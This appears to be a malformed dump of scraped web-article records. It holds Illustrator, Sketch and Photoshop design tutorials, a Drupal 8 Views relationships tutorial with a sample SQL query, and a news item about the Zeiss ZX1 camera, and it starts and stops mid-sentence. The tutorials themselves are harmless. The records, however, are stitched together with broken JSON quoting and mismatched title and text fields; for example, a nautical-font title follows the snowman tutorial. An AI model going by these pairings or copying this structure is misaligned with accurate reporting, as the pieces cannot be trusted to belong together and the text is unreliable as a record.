AirTTL-F is available to buy now for $1,099 or can be pre-ordered now for $1,199 as part of the off-camera kit, including the Connect Wireless Transmitter. \n[via DPReview ]",

      "text": "Winter season is the time of fluffy snow, snowballs and snowmen! Let\u2019s make one, too. In this tutorial, we\u2019ll be creating a cute snowman icon using basic geometric shapes, the Stroke panel and various tools and functions of Adobe Illustrator to create a simple snowman icon with outlines. Let\u2019s get started! \nTutorial Details \nProgram: Adobe Illustrator CS6 \u2013 CC \nDifficulty: Intermediate \nTopics Covered: Shape Building, Stroke Panel, Direct Selection Tool \nEstimated Completion Time: 15 minutes \nFinal Image: Snowman Icon \nStep 1 \nLet\u2019s start by creating a simple background in order to make our white snowman icon more visible. \nTake the Rounded Rectangle Tool , hold down Shift and make a 540 x 540 px shape. Fill it with a very light tint of pink in the Color panel. \nStep 2 \nNow grab the Ellipse Tool (L) , hold Shift and create a 200 x 200 px even circle. Set a white Fill and brown Stroke in the Color panel. \nOpen the Stroke panel ( Window > Stroke ) and set the Weight to 10 pt , Cap to Round Cap , Corner to Round Joint. \nStep 3 \nIf you\u2019re changing the size of an outlined object, you may find that the stroke is either scaling or not scaling together with the shape. This option can be controlled from the Preferences menu. Go to Adobe Illustrator > Preferences > General and tick the Scale Strokes & Effects checkbox if you want them to be scaled together with the size of your object. The same is for the corners of the objects \u2013 check this option if you want to change the size of the corners together with the size of the whole object. \nStep 4 \nLet\u2019s use the Ellipse Tool (L) to draw the eyes. Hold down Shift and create a 25 x 25 px brown-circle. \nCreate a smaller circle ( 8 x 8 px ) for the highlight. \nStep 5 \nGroup (Control-G) the elements of the eye. Take the Selection Tool (V) , click the group and move it to the right while holding the Alt-Shift combination. This way we create a copy of the selected object. \nNow we can group both eyes and center them by clicking Horizontal Align Center in the control panel on top or in the Align panel (Window > Align). \nStep 6 \nLet\u2019s add a carrot for the nose. Find the Polygon Tool in the Tools panel (in the same menu as the Rectangle Tool ) and double-click it. Set the Sides to 3 in the pop-up options window. \nCreate a triangle with orange Fill and brown Stroke . Set the Stroke Width value to 5 pt in the Stroke panel. \nRotate and shrink the triangle using the Selection Tool (V) , making it fit the face. \nFinally, add a couple of brown strokes to the carrot using the Pen Tool (P). \nStep 7 \nNow let\u2019s draw a mouth. Use the Ellipse Tool (L) to draw an oval with brown Stroke and no Fill , as shown in the image below. \nSelect the top point with the Direct Selection Tool (A) and press the Delete key ( Backspace on the Mac) to remove it. \nNow we have only the bottom part of the ellipse which forms a smiling shape. \nStep 8 \nNext, we\u2019ll create a hat. Take the Rounded Rectangle Tool and make a 115 x 35 px shape. \nUse the Rectangle Tool (M) to make a taller and narrower shape. Press Control-[ to Send Backward , placing the tall rectangle behind the short one, as shown in the screenshot below. \nUse the Direct Selection Tool (A) to move the top corners of the tall shape, making the top of the hat asymmetrical. \nStep 9 \nCopy (Control-C) the asymmetrical shape and Paste in Front (Control-F) . Shrink the shape, making it much shorter and change the fill color to orange to match the color of the carrot-nose. \nAdd two pink ovals (with no stroke) for the subtle blush on the cheeks. \nStep 10 \nLet\u2019s finish up with the face by adding the brows. Duplicate (Control-C > Control-F) the mouth shape, rotate it and make it much smaller. Place the brown above the eye of the snowman. \nKeeping the brow selected, double-click the Reflect Tool (O) in the Tools panel and select the Vertical Axis . Click the Copy button to create a second brow and move it to its proper position. \nStep 11 \nUse the Rectangle Tool (M) to make a shape for the scarf. Move its corners using the Direct Selection Tool (A) to make it asymmetrical. \nCopy the shape and Paste in Back (Control-C > Control-B) . Change the position of the corners to make the shapes look a bit different. \nKeep the Stroke weight of both shapes at 9 pt. \nStep 12 \nLet\u2019s add a finishing touch to the scarf by adding minor details. Use the Pen Tool (P) to draw a few strokes on the right edge of the shape. \nStep 13 \nUse the Ellipse Tool (L) and hold down Shift to create a tiny white circle for the snowflake. Speckle more snowflakes around the snowman icon, making the illustration look completed. \nCongratulations! Our Cute Snowman Icon is Finished! \nGreat job! I hope you\u2019ve enjoyed following this tutorial and learned some simple tips and tricks that can be helpful in creating more winter icons. \nYou can use these techniques to create a whole snowman by adding two more white circles for the body and smaller brown circles for the buttons. \nHave fun! \nThe post How to Draw a Cute Snowman Icon in Adobe Illustrator appeared first on Vectips .",

      "title": "How to Create a Nautical Tattoo Font",
      "text": "In this tutorial, I would like to show you how to create a nautical-looking font using Sketch. We will make use of simple shapes and the Vector tool along with Borders and Layer Styles to quickly create the nautical font. \nFor more inspiration on how to adjust or improve your final nautical flag alphabet font , you can find plenty of nautical or tattoo fonts at GraphicRiver . \n1. Set Up Your Document \nWith Sketch open, the default view already has an infinite Artboard . Since we are not creating anything that is a specific size, we can leave this as is. We will, however, be working with a grid, so let's turn that on at this time. \nOn the top Toolbar , select View > Grid Settings and change the values as seen below. \n2. Create Your First Letter of the Nautical Flag Alphabet Font \nStep 1 \nIn order to make my job easier, and inspired by some old nautical fonts, I've sketched some ideas that I would like to work from. This will help keep the theme of the nautical font even and provide a jumping-off point to start the vector process. \nIt isn't perfect, but it doesn't need to be. During the vector process, I even changed my mind about certain flourishes and shapes. These sketches are just there to provide a guide for my nautical sea font. \nStep 2 \nFrom my sketches, I can see that all of my nautical font characters are made up of a wide bar and a stroke to complete the shapes. I've decided that I want this wide bar to be two squares on my grid wide and eight squares tall. Making it 50 x 200 px . \nIn the case of the letter \"A\", this bar will be skewed slightly, so I found it easier just to create a custom shape using the Vector tool (V) . With the Vector tool selected, click on an intersecting grid point to start your shape. \nNext, count two squares to the left and click to create another point. Go over two squares and up eight and click to create another point. Now count over two squares to the right and click to make a point. Lastly, click on the starting point to close the shape. \nStep 3 \nNow let's create the other diagonal line that makes up the \"A\". Sketch has a Line tool that would be nice to use. However, this tool doesn't seem to play well with the grid, and lines drawn with this tool don't automatically snap into place. So we'll skip using this tool and make our lines using the Vector tool (V) . \nWith the Vector tool (V) selected once more, click on the top of the grid where the wide shape comes to a point, and then go down to the bottom and over three squares and click once more. You can then press Return on the keyboard to set the path. \nStep 4 \nWe'll now create our crossbar and serifs. Using the the Vector tool (V) again, click and create horizontal lines across the middle of the pyramid shape. Since it is eight grid squares high, this means the center will be four grid squares up or down. As for the serifs, these will hang over one grid square on each side. \n3. Apply the Nautical Font Styles \nStep 1 \nThe majority of our letterform is a simple stroke, but the wide bar needs to be styled to match our retro nautical tattoo theme. I'll be working in a nice aqua blue color, but feel free to use any color you choose. In the Layers List (leftmost pane), select all of the simple stroke layers, and then in the Inspector (rightmost pane), adjust the Borders section as seen below. If there are any fills, please be sure to remove them at this time. \nWith the strokes still selected, move to the Appearance section. Open the Layer Style menu and click Create New Layer Style to save the stroke as a preset for easier access later on. \nStep 2 \nNow select the wide bar shape, and this time we will be adjusting the Fill , Borders , and Inner Shadows elements. First, apply the saved Layers Style from the Appearance section. This will automatically apply the blue stroke for your selected shape. \nThe Fill will be a gradient. If you click on the fill icon, the Fill Color panel will fly in, and you can adjust these settings. From this panel, select Gradient , and a preset gradient will appear on the shape. \nIn order to edit a gradient, you will have to look on the Artboard at the shape, and you will notice two circle icons at the top and bottom of the shape in a straight line. By default, the top circle icon is selected, so if you change the color/opacity it will only affect that point. For now, let's set it to flat white with 100% opacity. On the Artboard , click the bottom circle icon and adjust the color to the same one as your stroke from earlier. \nStep 3 \nZoom in on your Artboard so you are in the center of the bar shape, and drag the circle icons from the top and bottom of the gradient towards the middle. If you hold Shift , the icon will move vertically without straying. Do this so they meet and make a horizontal line of your border color and white. \nNotice in the screenshot that this line is not exactly centered with the grid. I wanted the color to stop in line with the border of the crossbar. \nStep 4 \nWith the gradient the way we want it, press the Back button at the top of the Inspector and then adjust the Inner Shadows sections as outlined below. Once you're done, this will be the first letter from your nautical-looking font. \nWith these settings in place, save it as a new Layer Style in the Appearance section, as you did with the plain stroke. \n4. Create the Nautical Flag Alphabet Font \nUsing our initial sketch as a guide and our new Layer Styles , we'll continue creating the other letters in our nautical font. You should find this a quick and easy task as a lot of it will be repetition of the aforementioned steps. \nI'll assume you know how the alphabet looks, so rather than walking you through each letter, I'll stick to the major letter shapes that use different tools and techniques. Once you get used to these tips and tricks, maybe you'll be able to add the nautical font numbers on your own. \nStep 1 \nTo create the \"B\", we'll need to make a rectangle that is 50 x 200 px . This will be the main stem of the \"B\". To do so, select the Shape menu icon and choose the Rectangle tool (R) and draw your shape. Then add the Layer Style with the gradient fill. \nStep 2 \nTo create the bowl of the \"B\", we'll use the Rounded tool (U) and draw a rounded rectangle that is 150 x 100 px with a radius of at least half the height, so 50 . You can adjust this in the Inspector sidebar. \nStep 3 \nWith the rounded rectangle we just created still selected, enable the Edit tool from our Toolbar at the top and click on the top left point to select it. \nNow, in the Toolbar , a new set of options will become available. Among them you will see our 50 px corner setting. Click in that text box and change it to 0 . This will remove the rounded corner from that top left corner. Go ahead and repeat this for the bottom left point as well. \nStep 4 \nGo to Layer > Path > Scissors and click on the flat edge on the left to remove it. We will be using this tool a lot, so it may be in your best interest to save it to the Toolbar . To do so, right-click on the Toolbar or visit View > Customise Toolbar\u2026 and drag the tool to the Toolbar in a position that feels comfortable to you. \nSelect the Edit tool once again and click the bottom left point and drag it so it is no longer intersecting the stem of our \"B\". Now apply our simple stroke Layer Style . You can now finish it up by repeating these steps to create the bottom bowl shape and using the Vector tool to add an extra serif in the middle of the \"B\" stem. \nStep 5 \nOur \"C\" is pretty simple. It is basically a circle, but we've added in our stem to fill it out a bit. Select the Oval tool (O) and create a circle that is 200 x 200 px . \nStep 6 \nWith the Rectangle tool (R) , draw our main rectangle shape like earlier and align it to the left of the circle. Now Shift-click both shapes and go to Edit > Combine > Intersect or choose Intersect from the top Toolbar . You can now fill it with our gradient Layer Style . \nStep 7 \nDraw another circle the same size as last time and place it over the shape we just created. Select the Edit tool and hover over the circle edge, and you will see the cursor change to a pen icon with a \"+\". \nWhere the path intersects with the grid, click to create a new point both above and below the center point. Select the Scissors tool and remove the paths between these two points you just created to create an opening. You can now apply the simple stroke Layer Style and add in your serifs. \nStep 8 \nFollowing the above steps, you should be able to create the letters \"A\" through \"R\". It's pretty much just lather, rinse, repeat, following the theme and basic letter forms. The \"S\" is a bit different, however, so I'll explain that now. \nTo keep things in line, I decided to use the same angle as the letter \"A\" for all the other slanted letters, such as the \"V\", \"W\", and \"X\". However, this angle was a bit too harsh for the \"S\" and the \"Z\". So I've drawn a new angle for the \"S\" in this step. The block is still two grid squares wide, but instead of being three across, it is now four. So, as we did for the \"A\", select the Vector tool (V) and create your angled block as seen below. \nStep 9 \nSelect the Rounded tool (U) and draw a rounded rectangle that is 150 x 200 px with a radius of at least half the width, so 75 . Now Shift-click both shapes and go to Edit > Combine > Intersect or choose Intersect from the top Toolbar . You can now fill it with our gradient Layer Style . \nStep 10 \nEnable the Oval tool (O) and create two circles that are 150 x 150 px and place them directly over the previous shape, aligning one to the top and one to the bottom. Then select the Edit tool and hover over the circle edge, and you will see the cursor change to a pen icon with a \"+\". \nWhere the circle intersects with the underlying shape, click to create a new point. Select the Scissors tool and remove the paths between these two points you just created to create a semicircle. You can now apply the simple stroke Layer Style and add in your serifs. Do this for both the top and bottom circle, and your \"S\" should be complete. \nStep 11 \nThe \"Y\" is a custom shape drawn with the Vector tool (V) . You can see the steps below on how to create it. \nStep 12 \nFinally, for the \"Z\", I felt the angle was too steep, so I elongated it as we did for the \"S\", only I made this one a bit more pronounced. Feel free to play with it to your liking, but for me I went over five grid squares and then added the stems and serifs to finish it off. \nArr, \"X\" Marks the Spot, Matey! \nI hope I was able to show you a few time-saving techniques for reusing simple styles. Once you have the nautical font letters created, you can group the different elements together so that you can copy/paste the letters to form words and sentences. Challenge yourself and add the nautical numbers to the font. Stay tuned for future tutorials on how to use this nautical font in fun and crafty ways. \nFeel free to adjust the final design and try different nautical font styles. You can find some great sources of more inspiration at GraphicRiver , with interesting solutions to create nautical sea fonts or tattoo fonts. \nNautical Fonts From Envato Elements \nCut out the hassle of creating old nautical fonts from scratch.

      "title": "How to Create a Japanese Brush Font Text Effect in Photoshop",
      "text": "Creating a completely custom font effect from scratch may sound like a daunting task, but it's much less complicated than it might seem! And the task becomes even simpler when you put some high-quality resources to use\u2014resources that you can customize and alter so you still end up with something that's unique to you and your project! \nIn this quick tip, we will be taking a look at how to create a Japanese brush font text effect in Adobe Photoshop. \nFollow along with us over on our Envato Tuts+ YouTube channel : \nWhat You'll Need \nTo complete this project, we are using the following resources: \nBrush Stroke Background \nInky Brush Strokes Graphic Collection \nJapanese Matcha Green Tea \nLittle Samurai Font \nFind more resources on Envato Elements ! \n1. How to Create Paint Stroke Photoshop Brushes \nFirst, let\u2019s start by creating an ink brush Photoshop brush. \nStep 1 \nImport an image of painted brush strokes. Ideally, you want them to be long, with tapered and textured edges. \nStep 2 \nTurn the image black and white by going to Image > Adjustments > Desaturate. \nThese paint strokes are a little light, so let\u2019s darken them by going to Image > Adjustments > Brightness/Contrast and bringing the Contrast up to 100 and the Brightness down to -150. \nRepeat this step until your paint strokes are a nice solid black. \nStep 3 \nSelect your paint strokes by going to Select > Color Range and clicking on the black paint. Bring the Fuzziness all the way up to 200 and hit OK. \nStep 4 \nCreate a Color Fill layer set to black. The color fill layer will automatically take the shape of the selection! \nStep 5 \nSmooth out the edges of the paint stroke by double-clicking on the color fill layer's layer mask and choosing Select and Mask. \nSet Smooth to 9, Contrast to 24% , and Shift Edge to -30%. Your settings may vary, but we don\u2019t want to lose too much of that streaky brush texture, so be careful! \nStep 6 \nFinally, Crop down your paint stroke and go to Edit > Define Brush Preset. Name your brush, and you are done! \nYou will want to make as many brush strokes as possible, but alternatively, you can also download a set of premade brush strokes that come on a transparent background or a premade brush pack that is all ready to go! \nStep 7 \nIf you're not sure how to install Photoshop brushes, you will want to select the Brush Tool, open the Brush window, click on the Gear icon found in the top right-hand corner, and then select Import Brushes. \nFrom there, you will want to navigate to wherever you save your brushes, select them, and that\u2019s it! \n2. How to Create a Brush Stroke Font Effect \nFinally, let\u2019s move on to creating our Japanese-inspired text effect. \nStep 1 \nThis first step is optional, but it might help you out for your first few tries with this effect! \nChoose a font that's similar to the structure you want your text to have. In this case, the Japanese brush font \u201cLittle Samurai\u201d works perfectly. \nType out your word or phrase. Now, we can use this as a template when we are placing our brush strokes! \nStep 2 \nImport your brush stroke brushes, or have your brush stroke images (with a transparent background) in a folder nearby so you can drop or paint them in as needed. \nI will be using these brush stroke PNGs found on Envato Elements. \nStep 3 \nNow, it\u2019s a matter of combing different brush strokes to make different letters. Let\u2019s start with an easy one, \u201cM.\u201d \nDrag and drop your strokes to match up with the three vertical lines that make up the lower section of the \"M\", using our text as a guide. \nMake sure to use different strokes for each line. You want to avoid patterns and repetition! \nStep 4 \nPlace a fourth line going through the upper portion of all three lines. You have an \u201cM\u201d! \nI suggest grouping all of the brush strokes into their own group and naming it according to the letter they create. \nStep 5 \nYou can use the Paint Brush and Eraser Tool to add or take away detail from each line to add further fine-tuning and variation. \nAlso, remember to Flip lines Vertically and Horizontally and adust both their height and width to avoid the look of repetition. \nStep 6 \nUse the Warp Transform Mode to create and match curves, and to fit the strokes to match the shape of the template text. \nDo these steps over and over until all of your letters are created! \nStep 7 \nChange the color of the text by adding a Color Fill layer and clipping it into your master group\u2014the group holding all of your letters. \nYou can also go ahead and fill in any sparse spots quickly by creating a New Layer below all of your text layers and painting using a hard white brush. This will help your paint look fuller, if that's the look you are going for! \nWe've Done It! \nAnd there you have it! You can whip up these painted letters in a matter of minutes, and if you find yourself reaching for this kind of text effect fairly often, go ahead and create the whole alphabet, save it in a PSD file, and you've officially created your very own template! \nSo, as always, keep experimenting with different techniques and practicing, and don't forget to post your version below, along with any questions, comments, or critiques! \nMore Japanese Brush Fonts \nOkami - Brush Font \nOkami is a hand-drawn brush font with rough and bold letters. It's great for logos, branding, print projects, and of course creating a Japanese brush font text effect! \nPetal Brush \nPetal is a beautiful brush font that was handcrafted by yours truly with a Japanese brush pen. The font is full of character and personality and sits comfortably with modern trends. \nWonderfont Brush Typeface \nThis font face is ideal for creating a Japanese brush font effect that comes off more rustic and unrefined! \n30 Acrylic Brush Strokes \nThis collection contains 30 isolated high-resolution brush texture strokes made using yellow acrylic paint and many different paintbrushes perfect for creating a Japanese brush font effect. \n66 Long Ink Strokes Photoshop Stamp Brushes \nDownload 66 hand-painted ink Photoshop brushes that work with any Photoshop version!

      "text": "Today\u2019s tutorial is one you\u2019ll want to \u201csave!\u201d We\u2019re going to learn how to illustrate a USB icon, using some of the basic shapes and tools you work with daily. \nSo, assuming you already have Illustrator running, pull it up and let\u2019s get started on your USB flash drive illustration! \nTutorial Details: How to Illustrate a USB Icon \nProgram: Adobe Illustrator CS6 \u2013 CC \nDifficulty: Beginner \nTopics Covered: Design Theory, Compositional Construction, Shape Alignment, Grid Positioning \nEstimated Completion Time: 25 Minutes \nFinal Image: USB Icon \nStep 1 \nWelcome back to our retro hardware series . In order to illustrate a USB icon, we\u2019ll first start by setting up a New Document . We\u2019ll do this by heading over to File > New (or by using the Control-N keyboard shortcut), which we\u2019ll adjust as follows: \nNumber of Artboards: 1 \nWidth: 128 px \nHeight: 128 px \nUnits: Pixels \nAnd from the Advanced tab: \nColor Mode: RGB \nRaster Effects: Screen (72ppi) \nPreview Mode: Default \nQuick tip: most of the indicated settings can be automatically triggered if you set the document\u2019s Profile to Web ; the only one you\u2019ll have to adjust manually is the Artboard\u2019s Size ( Width x Height ). \nStep 2 \nOnce we\u2019ve set up our project file, we actually start to illustrate a USB icon. We\u2019ll start by creating the background using a 120 x 120 px circle which we will color using #F15A24 , and then position to the center of the underlying Artboard . \nStep 3 \nAdd the main shape for the storage unit\u2019s connector using a 20 x 20 px square which we will color using white ( #FFFFFF ), and then center align to the larger underlying circle, positioning it at a distance of 30 px from its top anchor point . \nStep 4 \nGive the shape that we\u2019ve just created an outline using the Stroke method. Do this by creating a copy of itself ( Control-C ) which we\u2019ll paste in front ( Control-F ) and then adjust by changing its color to #2A323D . Then, flip its Fill with its Stroke ( Shift-X ), setting its Weight to 4 px and its Corner to Round Join , making sure to select and group the two shapes together using the Control-G keyboard shortcut. \nStep 5 \nAdd the little cutouts using two 4 x 4 px squares ( #2A323D ), which we\u2019ll horizontally distance at 4 px from one another, grouping ( Control-G ) and then positioning them as seen in the reference image. Once you\u2019re done, make sure you select and group all of the current section\u2019s composing shapes using the Control-G keyboard shortcut. \nStep 6 \nCreate the flash drive\u2019s main body using a 32 x 40 px rounded rectangle ( #FFFFFF ) with a 4 px Corner Radius and a 4 px thick outline ( #2A323D ), which we\u2019ll group ( Control-G ) and then position onto the lower section of the connector, so that their paths end up overlapping. \nStep 7 \nStart working on the flash drive\u2019s sliding mechanism. You can do this by creating the cutout section, using a 12 x 8 px rectangle with a 4 px thick Stroke ( #2A323D ), which we will center align to the larger body. Position it at a distance of 4 px from its top edge. \nStep 8 \nAdd the button using a 12 x 8 px rectangle ( #2A323D ) with a 4 px thick outline ( #2A323D ), which we will group ( Control-G ) and then position below the previous shape, so that their paths overlap. Once you\u2019re done, select and group both of them together using the Control-G keyboard shortcut. \nStep 9 \nCreate the horizontal detail line using an 8 px wide 4 px thick Stroke ( #2A323D ) with a Round Cap , which we will position below the button, making sure to leave a 4 px gap in between them. Once you\u2019re done, you can select and group ( Control-G ) all of the current section\u2019s composing shapes, doing the same for the entire storage unit afterwards. \nStep 10 \nFinish off the project by adding the circular shadow. You can do this by using a 36 x 4 px ellipse, which we will color using #2A323D , and then center align to the stick, positioning it at a distance of 8 px from its bottom edge. Once you\u2019re done, select and group all of the icon\u2019s composing shapes together using the Control-G keyboard shortcut. \nGreat Job\u2026 you can now illustrate a USB icon! \nAs always, I hope you had fun working on our project! If you have any questions, feel free to post them within the comments section, and I\u2019ll get back to you as soon as I can. \nThe post How to Illustrate a USB Icon in Adobe Illustrator appeared first on Vectips .",

      "title": "Drupal 8 Views tutorial for developers. Part V\u200a\u2014\u200aRelationship",
      "text": "Jan 18 \nIn this chapter we shall explore in depth the notion of Views relationships. \nTo explain the concept of relationships we must return to the notion of base and non-base tables in Views. So imagine you want to have a view that displays data of a node and its author simultaneously. Ahm\u2026 views are built on top of one single base table, you can\u2019t have two. \nThis contradiction is solved through relationships. In a way it is similar to SQL JOIN\u200a\u2014\u200ayou tell views that another base table (from a list of known relationships collected from your currently available tables) should be introduced and views internally construct necessary JOINs to actually have the additional base table included within your SQL. \nThat way you can actually start building your view on a node base table. Introduce the relationship of \u2018node author\u2019 (which implies adding user base table) and then you could use everything user base table has to offer (fields, sorts, filters, etc). Moreover, the actual user data that will be backing it up effectively will be the node author because SQL JOIN will be joining the user table on the node\u2019s author column. Eventually your view still parts from one single base table node and everything sort of \u2018unrolls\u2019 from there, i.e. user data within your view stands connected to the starting point\u200a\u2014\u200a node base table. \nSuch technique allows to reuse almost entire code independently of the scenario your view is running: displaying user data when it\u2019s actual starting point of a view, or when it\u2019s a JOINed table to some other base table. Same $views_data information will be used in both cases for the user table and thus same handlers will be used too. \nIf you remember, in case of contextual filters (arguments) there was additional underlying handler type, argument validator. Something similar happens with relationship. There is a relationship handler which is the one that lays on the surface, so to say. We could say that its primary objective is to figure out what/how new base table should be JOINed. However, to produce actual SQL JOINs, it relies on another handler type, join . Therefore, join handler type is more of a hummer-tool, it just produces SQL JOINs based on pretty low-level specification without much knowledge as to why those JOINs are being generated. \nThis is the minimal set of theory you have to know about relationships. Now let\u2019s see how we could actually play with them. \nRemember our fruit_relations table? It\u2019s about time to make some use of it. We should figure out a relationship that would allow us to reference Sweeter than and Bigger than fruits of the \u2018current\u2019 fruit. Make sure to insert enough data into both of your tables so you have actual toys to play with. \nRelations in a RDBMS are pretty straightforward and routine: you have a table whose column is a foreign key to another table. Sure, there could be OneToOne, ManyToMany with all the intermediate steps between them. All in all, there is a relationship handler that works perfect for this routine case, it\u2019s called standard (duh) . Observe the snippet from hook_views_data() that depicts how to use it: \nWith this extra data in your hook_views_data() we now can introduce a relationship onto related fruits. As I was saying above, now all of the views handlers we have coded so far automatically become available on the related fruits too! \nI would strongly suggest you reading through \\Drupal\\views\\Plugin\\views\\relationship\\RelationshipPluginBase and \\Drupal\\views\\Plugin\\views\\join\\JoinPluginBase to shape reasonable understanding of all the toolset Views module ships out of the box for introducing new relationships. It is extremely robust, in fact, during my entire career I only had to code a custom relationship handler once\u200a\u2014\u200a https://www.drupal.org/project/webform_views/issues/3008750 \nGiven the high unlikelihood of you having to code custom handlers of these types, I chose not to include this part of exercise into the series. \nHowever, there is something else we could explore. Because there are actually two types of relation ( sweeter than and bigger than ) our business logic might require us to distinguish between them. This means we need to introduce 2 different relationships for the same physical DB column. If you remember, in the early chapters of this tutorial I mentioned it is possible to assign 2 different handlers of the same type to a DB column by the virtue of having 2 different views columns that both point to the same DB column. Let\u2019s explore this in practice on the case of relationships from fruit_relations table. We will append 2 additional relationships for each possible relation respectively. \n\u00a1Voil\u00e0!\u2014 Now we can specifically reference either sweeter or bigger fruit (or even both!) despite the fact that actual relationship is stored within same column. By using Views \u2018virtual\u2019 columns we managed to get by this limitation. \nOn this print screen I introduced both relationships and included labels of the bigger and sweeter than fruits into the table of results. \nActual SQL executed: \nSELECT fruit.label AS fruit_label, fruit.weight AS fruit_weight, fruit.weight_unit AS fruit_weight_unit, fruit_fruit_relations.label AS fruit_fruit_relations_label, fruit_fruit_relations_1.label AS fruit_fruit_relations_1_label \nFROM \n{fruit} fruit \nLEFT JOIN {fruit_relations} fruit_relations ON fruit.id = fruit_relations.fruit_id \nLEFT JOIN {fruit} fruit_fruit_relations ON fruit_relations.fruit_id_related = fruit_fruit_relations.id AND fruit_relations.relation = 'bigger' \nLEFT JOIN {fruit} fruit_fruit_relations_1 ON fruit_relations.fruit_id_related = fruit_fruit_relations_1.id AND fruit_relations.relation = 'sweeter' \nLIMIT 11 OFFSET 0 \nAt last, let\u2019s spend some time catching up one important dimension we have been ignoring so far, Config schema API . \nViews are nothing else but Config Entities in Drupal 8 terminology. This means they are subject to configuration schema, i.e. they must report their metadata and comply with it afterwords. At this point it is worth to note that we have been writing custom views handlers throughout this series some of which have been using non-standard options (the properties described within ::defineOptions() method). This means we have messed up config metadata and, as authors of the new handlers, are to fix it. \nTo begin with, I suggest you installing the spectacular module Config Inspector that allows you to identify any issues with your current config metadata. Scan your configs using that module and you shall see that any view that uses our custom handlers have errors in the metadata. \nRead the awesome drupal.org documentation on the subject: https://www.drupal.org/docs/8/api/configuration-api/configuration-schemametadata if you want to deep-dive into this. As far as Views are concerned, you ought to know the following: because of Views\u2019 modular nature (different handlers applied in different set ups for different views), similar modular approach is used towards views\u2019 metadata. Ultimately, an individual view is a single Config Entity and thus must individually report its metadata. So what it does is that it \u2018outsources\u2019 so to say nested values of its metadata to one or another handler\u2019s metadata depending on what actual handlers the view is set up to use. \nTherefore, we as developers of views handlers, must focus on describing metadata of all the custom handlers we have coded so far. Once we have their metadata described correctly, Views module will pick it up and will distribute under appropriate keys to each individual view that utilizes any of our custom handlers. \nMatters actually do not stand all that bad, if no schema metadata is defined for a particular views handler, Views module falls back onto the most generic metadata for a handler of that type. What does it mean? It means as long as your views handler does not introduce additional options, you have nothing to worry about. Considering all the custom handlers we have coded during this tutorial, there are only 3 of them that make custom use of options. Thus placing the following metadata into your ./config/schema/fruity_views.schema.yml should do the job: \nClear the caches, re-save your view, and navigate to Config Inspector again. At this point you should not see a single error related to your view. \nFinal words \nAhm\u2026 You made it! If you have not dropped out nor fallen asleep throughout the series, then you officially know everything I believe a true Drupal developer should know about Views. I hope it was fun and full of useful discoveries for you. \nThe final source code of the entire fruity_views module is available in the part-5 branch here .",

      "text": "How to Apply Creative Makeup with Photoshop \nIn this Photoshop tutorial I\u2019ll show you how to add a colorful, fashion and creative makeup to a woman\u2019s portrait. \nThis tutorial focuses on how to use colors and the layer modes. \nFinal Image \nTutorial Details \nProgram : Photoshop CS3+ \nEstimated Completion Time : 30 minutes \nDifficulty : Beginner \nResources \nStep 1 \nOpen the model image. Use the Crop Tool (C) to select the face and the upper of the neck only and hit OK to appy the change. \nStep 2 \nFirst we\u2019ll fix the lip color to fit the colors of the cheeks and the flowers on her head. Use the Polygonal Lasso Tool (L) to select the lips only. Go to Layer > New Adjustment Layer > Hue/Saturation : \nStep 3 \nCreate a new layer and use a soft brush with the color #7e2224 to paint on the inner edges of the eyes. Change this layer mode to Overlay 100% : \nStep 4 \nMake a new layer and use a soft brush with the color #5e8052 to paint on the lower and the outer edges of the eyes. Set the mode of this layer to Overlay 100% : \nStep 5 \nUse another layer and a soft brush with the color #dbdfa4 to paint on the middle of the eyelids. Change this layer mode to Overlay 70% : \nStep 6 \nContinue painting more color for the lower edgeds of the eyes with the color #8d6d72 . Set this layer mode to Overlay 100% : \nStep 7 \nMake a new layer and use a soft white brush to paint a curvy line from the edge of the left eye and change its mode to Soft Light 100% : \nStep 8 \nPaint a small curve with the color changed to #7e5822 on the same area and put the mode to Overlay 100% : \nStep 9 \nUse another color ( #597540 ) to paint on the outer edge of the left eye. Change this layer mode to Soft Light 100% . \nStep 10 \nMake a new layer and use the Pen Tool (P) to create a shape on the eyelid of the left eye. Hit Ctrl+Enter to turn it into a selection and fill it with the color #7e2224 . Change this layer mode to Overlay 50% : \nStep 11 \nMake another shape with the color #227e25 and set the mode to Overlay 100% : \nStep 12 \nDuplicate the layers in from step 10 and 11 and move them to the right eye. Use Ctrl+T to transform their shape to fit the eye perspective. \nStep 13 \nIsolate a gem from the necklace image and add it to the left eyelid. \nStep 14 \nDouble click this layer, choose Drop Shadow : \nStep 15 \nDuplicate this layer many times and arrange the gems along the colorful shapes of the eyes but you don\u2019t need to follow mine exactly (feel free to do it in the way you want!). \nStep 16 \nSelect all the gem layers and press Ctrl+G to group them. Change this group\u2019s mode to Normal 100% . Use a Hue/Saturation adjustment layer at the top of the group to match the gem color with the face: \nStep 17 \nMake a Curves adjustment layer to darken the gems. On this layer mask, use a soft black brush to paint on the gems shown in the screenshot below as they\u2019re in the bright area of the face: \nAnd We\u2019re Done! \nI hope that you enjoyed this tutorial.",

      "text": "The Zeiss ZX1 might finally be close to release after Adobe adds support to Camera Raw \nDecember 11, 2019 by John Aldred Leave a Comment \nIt\u2019s been a minute since we last heard anything about the Lightroom-powered Zeiss ZX1 camera. Almost a whole year , in fact. It was first announced rather quietly at Photokina 2018 last September followed by a brief hands-on in December , but since then it\u2019s been radio silence. \nNow it looks like it might be one step closer to actually being released after support for its DNG files was added to the latest Adobe Camera Raw 12.1 update. \nIn amongst the familiar names like the Sigma fp , Sony A9 II , Nikon Z50 , Leica SL2 , Canon EOS Ra & M200 , and even Google Pixel 4 phones, there the little Zeiss ZX1 sits at the bottom of the list. As an aside, you can see the complete list of cameras that Adobe Camera Raw supports, and the minimum version required for each here . \nAs a reminder, here are the specs for the Zeiss ZX1 camera. The Zeiss ZX1 website still matches these specs, so it doesn\u2019t sound like it\u2019s had any revisions or alterations since the initial release. \nSensor: Full frame 37.4MP \nISO: 80-51,200 \nShutter speed: 1/8000 \u2013 30sec \nLens: Zeiss Distagon 35mm f/2 T* \nMax aperture: f/2 \nMin aperture: f/22 \nMinimum focus distance: 30cm \nLCD: 4.34\u2033 1280x720px touchscreen LCD \nEVF: 0.7\u2033 1920x1080px OLED \nStorage: 512GB internal / External via Type-C USB \nVideo: 4K UHD up to 30fps, 1080p up to 60fps \nConnectivity: 802.11b/g/n/a/ac, Bluetooth 4.1LE, USB-C 3.1, microphone, headphone & HDMI via USB-C. \nDimensions: 142 x 93 x 46mm (+20mm lens) \nWeight: 800g (with battery) \nIt\u2019s an interesting and somewhat unique camera. It\u2019s not that the specs are anything all that special, especially now, over a year after the initial announcement. But what makes it interesting is that it actually runs Lightroom CC inside the camera itself. Needless to say, it gathered a lot of interest \u2013 at least in finding out how it works, even if not to purchase it. \nWhile Zeiss is still yet to make any new announcements about the 